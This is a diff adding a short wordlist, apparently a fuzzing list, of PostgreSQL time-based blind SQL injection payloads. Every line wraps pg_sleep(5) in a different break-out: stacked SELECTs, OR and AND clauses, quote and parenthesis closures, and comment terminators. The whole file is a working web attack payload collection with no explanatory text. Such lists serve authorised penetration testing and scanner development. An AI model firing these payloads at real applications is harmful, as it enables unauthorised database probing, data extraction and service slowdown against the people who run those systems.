@@ -1,0 +1,29 @@
+";SELECT pg_sleep(5);
+;SELECT pg_sleep(5);
+and SELECT pg_sleep(5);
+1 SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+1 or pg_sleep(5)--
+" or pg_sleep(5)--
+' or pg_sleep(5)--
+1) or pg_sleep(5)--
+") or pg_sleep(5)--
+') or pg_sleep(5)--
+1)) or pg_sleep(5)--
+")) or pg_sleep(5)--
+')) or pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)--
+pg_SLEEP(5)#
+or pg_SLEEP(5)or pg_SLEEP(5)--
+or pg_SLEEP(5)#
+' SELECT pg_sleep(5);
+or SELECT pg_sleep(5);
+' SELECT pg_sleep(5);
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))
+1 AND 1337=(SELECT 1337 FROM PG_SLEEP(5))-- 1337
+1' AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND '1337'='1337
+1') AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND ('1337'='1337
+1) AND 1337=(SELECT 1337 FROM PG_SLEEP(5)) AND (1337=1337
